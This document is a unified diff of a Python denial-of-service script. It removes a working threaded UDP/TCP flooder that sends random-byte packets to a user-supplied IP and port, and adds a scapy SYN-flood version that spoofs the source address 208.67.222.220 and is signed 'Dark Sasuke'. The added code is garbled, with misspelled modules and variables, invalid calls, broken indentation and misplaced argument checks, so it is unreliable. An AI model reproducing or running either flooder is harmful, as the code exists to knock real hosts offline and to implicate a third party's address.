@@ -1,65 +1,38 @@
-import random
-import socket
-import threading
-import os,sys
+#!/usr/bin/env python
+from scapy.all import *
+from time import sleep
+import os,sys,re,commands,signal,logging,random
+import theard
+traget = str(sys.argv[1])
+ddport = int(sys.argv[2])
+theards = int(sys.argv[3])
 
-os.system("clear")
-print("UBAH INI")
-ip = str(input(" Ip:"))
-port = int(input(" Port:"))
-choice = str(input(" (y/n):"))
-times = int(input(" Packets:"))
-threads = int(input(" Threads:"))
-os.system("clear")
-def ddos():
-	data = random._urandom(1025)
-	i = random.choice(("[•]","[•]","[•]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print(i +" Attack!!!")
-		except:
-			print("[!] Down!!!")
+def tcpdos(target,ddport):
+  while 1:
+    try:
+      x = random.random(1023,65535)
+      spoof = "208.67.222.220"
+      send(IP(dst=target,src=spoof)/TCP(sport=x,dport=ddport,flags="S"),verbose1)
 
-def ddos2():
-	data = random._urandom(180)
-	i = random.choice(("[•]","[•]","[•]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print(i +" Attack!!!")
-		except:
-			s.close()
-			print("[!] Down!!!")
+    except:
+    pass
 
-def ddos3():
-	data = random._urandom(16)
-	i = random.choice(("[•]","[•]","[•]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print(i +" Attack!!!")
-		except:
-			s.close()
-			print("[!] Down!!!")
+def shutdown(signal,frame):
+  print "CTRL+C was pressed,shutting down"
+  sys.exit()
 
-for y in range(threads):
-	if choice == 'y':
-		th = threading.Thread(target = ddos)
-		th.start()
-		th = threading.Thread(target = ddos2)
-		th.start()
-	else:
-	    th = threading.Thread(target = ddos3)
-	    th.start()
+signal.signal(signal.SIGINT, shutdown):
+print "use CTRL+C to stopping the attack"
+print "the attacking is starting..."
+sleep(2)
+
+for t in range(0,theards):
+  theard.start_new_theard(tcpdos,(target,ddport))
+  while 1:
+  sleep(1)
+
+if len(sys.argv) != 4:
+ print "Usage: python namafile.py <ip> <port> <theards>"
+ print "Coded By Dark Sasuke."
+ print "Dark Sasuke"
+ sys.exit()
